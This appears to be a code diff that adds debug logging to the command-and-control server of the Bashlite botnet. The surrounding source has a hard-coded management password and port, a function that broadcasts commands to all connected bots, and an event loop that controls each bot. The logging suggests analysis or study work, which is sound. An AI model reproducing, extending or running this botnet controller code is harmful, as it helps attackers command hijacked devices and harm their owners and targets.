@@ -18,6 +18,7 @@
 #include <errno.h>
 #include <pthread.h>
 #include <signal.h>
+#include "debug_bashlite.h"
  
 #define MY_MGM_PASS "password"
 #define MY_MGM_PORT 8888
@@ -113,10 +114,14 @@ static int create_and_bind (char *port)
                 return -1;
         }
         freeaddrinfo (result);
+
+		DEBUG("create and bind port done"); 
         return sfd;
 }
 void broadcast(char *msg, int us) // sends message to all bots, notifies the management clients of this happening
 {
+		DEBUG("broadcast sends msg to all bots ...");
+		DEBUG(msg);
         int sendMGM = 1;
         if(strcmp(msg, "PING") == 0) sendMGM = 0; // Don't send pings to management. Why? Because a human is going to ignore it.
         char *wot = malloc(strlen(msg) + 10);
@@ -130,6 +135,7 @@ void broadcast(char *msg, int us) // sends message to all bots, notifies the man
         char *timestamp = asctime(timeinfo);
         trim(timestamp);
         int i;
+		DEBUG("send to bots one by one ...");
         for(i = 0; i < MAXFDS; i++)
         {
                 if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
@@ -145,10 +151,12 @@ void broadcast(char *msg, int us) // sends message to all bots, notifies the man
                 else send(i, "\n", 1, MSG_NOSIGNAL);
         }
         free(wot);
+		DEBUG("broadcast sends msg to all bots done");
 }
  
 void *epollEventLoop(void *useless) // the big loop used to control each bot asynchronously. Many threads of this get spawned.
 {
+		DEBUG("epoll loop to control each bot asyn...");
         struct epoll_event event;
         struct epoll_event *events;
         int s;
@@ -319,6 +327,7 @@ void *titleWriter(void *sock) // just an informational banner
         {
                 memset(string, 0, 2048);
                 sprintf(string, "%c]0;Bots connected: %d | Clients connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
+				DEBUG(string);
                 // \007 is a bell character... causes a beep. Why is there a beep here?
                 if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
  
